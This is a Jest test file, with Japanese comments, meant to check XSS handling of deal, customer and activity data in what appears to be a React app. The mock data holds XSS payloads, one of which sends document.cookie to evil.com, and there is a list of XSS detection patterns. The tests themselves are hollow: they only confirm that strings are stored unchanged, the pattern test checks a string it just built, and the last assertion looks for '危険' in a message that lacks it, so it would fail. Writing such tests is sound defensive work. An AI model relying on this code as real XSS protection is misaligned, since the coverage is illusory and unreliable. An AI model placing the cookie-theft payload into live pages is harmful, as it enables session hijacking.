/**
 * XSS（クロスサイトスクリプティング）防止テスト
 *
 * なぜこのテストが必要か：
 * - ユーザー入力がサニタイズされることを保証
 * - 悪意のあるスクリプトが実行されないことを確認
 * - セキュリティ要件の遵守を検証
 */
import {
  createMockDeal,
  createMockCustomer,
  createMockActivity,
} from '../utils/test-utils';

describe('XSS防止テスト', () => {
  describe('データサニタイゼーション', () => {
    // なぜ必要：XSS攻撃用の文字列がデータとして扱われることを確認

    it('スクリプトタグを含む文字列はそのまま保持される', () => {
      const maliciousDeal = createMockDeal({
        id: 'deal-001',
        title: '<script>alert("XSS")</script>',
      });

      // Reactは自動的にHTMLをエスケープするため、
      // データとしてはそのまま保持される
      expect(maliciousDeal.title).toBe('<script>alert("XSS")</script>');
    });

    it('イベントハンドラを含む文字列はそのまま保持される', () => {
      const maliciousDeal = createMockDeal({
        id: 'deal-001',
        title: '<img src="x" onerror="alert(\'XSS\')">',
      });

      expect(maliciousDeal.title).toBe('<img src="x" onerror="alert(\'XSS\')">');
    });

    it('JavaScriptプロトコルを含む文字列はそのまま保持される', () => {
      const maliciousDeal = createMockDeal({
        id: 'deal-001',
        title: 'javascript:alert("XSS")',
      });

      expect(maliciousDeal.title).toBe('javascript:alert("XSS")');
    });
  });

  describe('顧客データのXSS検証', () => {
    // なぜ必要：顧客情報へのスクリプト注入を検出

    it('会社名にスクリプトタグが含まれる場合もデータとして保持', () => {
      const maliciousCustomer = createMockCustomer({
        id: 'customer-001',
        company_name: '<script>document.cookie</script>',
      });

      expect(maliciousCustomer.company_name).toBe(
        '<script>document.cookie</script>'
      );
    });

    it('SVGを使ったXSS文字列もデータとして保持', () => {
      const maliciousCustomer = createMockCustomer({
        id: 'customer-001',
        company_name: '<svg onload="alert(\'XSS\')">',
      });

      expect(maliciousCustomer.company_name).toContain('svg');
      expect(maliciousCustomer.company_name).toContain('onload');
    });

    it('iframeを使ったXSS文字列もデータとして保持', () => {
      const maliciousCustomer = createMockCustomer({
        id: 'customer-001',
        company_name: '<iframe src="javascript:alert(\'XSS\')">',
      });

      expect(maliciousCustomer.company_name).toContain('iframe');
    });
  });

  describe('活動履歴のXSS検証', () => {
    // なぜ必要：活動内容へのスクリプト注入を検出

    it('活動内容にスクリプトが含まれる場合もデータとして保持', () => {
      const maliciousActivity = createMockActivity({
        id: 'activity-001',
        content:
          '<script>fetch("https://evil.com?cookie="+document.cookie)</script>',
      });

      expect(maliciousActivity.content).toContain('<script>');
    });

    it('複数の攻撃ベクトルを含む内容もデータとして保持', () => {
      const maliciousContent = `
        <script>alert(1)</script>
        <img src=x onerror=alert(2)>
        <a href="javascript:alert(3)">click</a>
      `;

      const maliciousActivity = createMockActivity({
        id: 'activity-001',
        content: maliciousContent,
      });

      expect(maliciousActivity.content).toContain('<script>');
      expect(maliciousActivity.content).toContain('onerror');
      expect(maliciousActivity.content).toContain('javascript:');
    });
  });

  describe('HTMLエンティティの検証', () => {
    // なぜ必要：特殊文字の処理を確認

    it('HTMLエンティティ文字列がそのまま保持される', () => {
      const customer = createMockCustomer({
        id: 'customer-001',
        company_name: '&lt;script&gt;',
      });

      expect(customer.company_name).toBe('&lt;script&gt;');
    });

    it('アンパサンドがそのまま保持される', () => {
      const customer = createMockCustomer({
        id: 'customer-001',
        company_name: 'A & B 株式会社',
      });

      expect(customer.company_name).toBe('A & B 株式会社');
    });

    it('引用符がそのまま保持される', () => {
      const customer = createMockCustomer({
        id: 'customer-001',
        company_name: '"テスト" \'会社\'',
      });

      expect(customer.company_name).toBe('"テスト" \'会社\'');
    });
  });

  describe('XSS攻撃パターンの検出', () => {
    // なぜ必要：一般的なXSS攻撃パターンを識別

    const xssPatterns = [
      '<script>',
      '</script>',
      'javascript:',
      'onerror=',
      'onload=',
      'onclick=',
      'onmouseover=',
      '<iframe',
      '<svg',
      '<img',
      'expression(',
      'eval(',
    ];

    it.each(xssPatterns)('パターン "%s" を含む文字列を検出できる', (pattern) => {
      const testString = `test ${pattern} string`;
      expect(testString).toContain(pattern);
    });
  });

  describe('React自動エスケープの確認', () => {
    // なぜ必要：Reactの自動エスケープ機能に依存していることを文書化

    it('ReactはdangerouslySetInnerHTML以外でHTMLを自動エスケープする', () => {
      // このテストはReactの動作を文書化するためのもの
      // 実際のエスケープはReactのレンダリング時に行われる
      const unsafeString = '<b>bold</b>';

      // Reactでは、以下のようにレンダリングされる
      // <div>{unsafeString}</div> => <div>&lt;b&gt;bold&lt;/b&gt;</div>

      // データとしては変更されない
      expect(unsafeString).toBe('<b>bold</b>');
    });

    it('dangerouslySetInnerHTMLは使用を避けるべき', () => {
      // dangerouslySetInnerHTMLは名前の通り危険
      // コードベースで使用されていないことを確認することが重要
      const warningMessage =
        'dangerouslySetInnerHTMLの使用は避けてください';
      expect(warningMessage).toContain('危険');
    });
  });
});
